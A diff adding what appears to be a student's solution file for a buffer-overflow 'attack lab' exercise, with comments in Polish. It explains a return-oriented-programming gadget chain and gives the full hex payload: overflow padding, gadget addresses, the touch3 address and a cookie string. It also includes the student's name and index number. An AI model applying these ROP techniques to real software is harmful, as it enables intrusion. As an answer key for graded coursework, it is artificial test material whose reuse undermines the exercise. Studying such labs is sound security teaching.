@@ -1,0 +1,50 @@
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Artur Bieniek, 347165
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+
+ Ustawiamy w rdi adres char * w którym jest tekstem ciasteczko, ten adres będzie na stosie, tylko że tym razem adres stosu się zmienia i nie możemy wykonać łatwo instrukcji dodawania, więc trzeba to dodawanie zbudować z gadżetów
+
+ Użyteczne gadżety: (składnia jest Intel, w algorytmie będzie już AT&T)
+ 401ccd:	8d 87 58 90 90 c3    	lea    -0x3c6f6fa8(%rdi),%eax ; (+2) pop rax;
+ 401cd4:	8d 87 f2 48 89 c7    	lea    -0x3876b70e(%rdi),%eax; (+3) mov rdi, rax;
+ 401d01:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax; (+0) lea samo w sobie, doda rdi+rsi i wynik w rax
+ 401d1a:	c7 07 48 89 e0 c3    	movl   $0xc3e08948,(%rdi); (+2) mov rax, rsp ! mega użyteczne rsp->rax
+ 401d27:	8d 87 89 c2 84 d2    	lea    -0x2d7b3d77(%rdi),%eax; (+2) mov edx, eax ale ustawia flagi
+ 401d6f:	b8 cf 89 d1 90       	mov    $0x90d189cf,%eax; (+2) mov ecx, edx; nop
+ 401d56:	b8 89 ce 08 db       	mov    $0xdb08ce89,%eax; (+1) mov esi, ecx; or bl, bl;
+
+ Idea algorytmu:
+ CEL: Wrzucić rsp+offset do rdi
+
+ rsp -> rax
+ rax -> rdi
+ pop -> rax (wrzucamy offset jako next wartość na stosie)
+ rax -> rsi (ale nie ma takiego gadżetu więc trzeba go stworzyć):
+    (to, że zerujemy najstarsze 32 bity nie ma znaczenia, nasz offset mieści się na 8 bitach)
+    eax -> edx
+    edx -> ecx
+    ecx -> esi
+ rdi+rsi->rax (lea)
+ rax -> rdi
+ */
+
+de ad c0 de de ad c0 de /* przepełnienie 40 bajtów bufora */
+de ad c0 de de ad c0 de
+de ad c0 de de ad c0 de
+de ad c0 de de ad c0 de
+de ad c0 de de ad c0 de
+1c 1d 40 00 00 00 00 00 /* mov %rsp, %rax */
+d7 1c 40 00 00 00 00 00 /* mov %rdi, %rax */
+cf 1c 40 00 00 00 00 00 /* pop %rax */
+48 00 00 00 00 00 00 00 /* offset od rsp przy pierwszej instrukcji do ciasteczka */
+29 1d 40 00 00 00 00 00 /* mov %eax, %edx */
+71 1d 40 00 00 00 00 00 /* mov %edx, %ecx */
+57 1d 40 00 00 00 00 00 /* mov %ecx, %esi */
+01 1d 40 00 00 00 00 00 /* lea (%rdi,%rsi,1), %rax */
+d7 1c 40 00 00 00 00 00 /* move %rax, %rdi */
+32 1c 40 00 00 00 00 00 /* adres touch3 */
+35 34 61 65 63 33 63 64 /* ciasteczko w ascii */
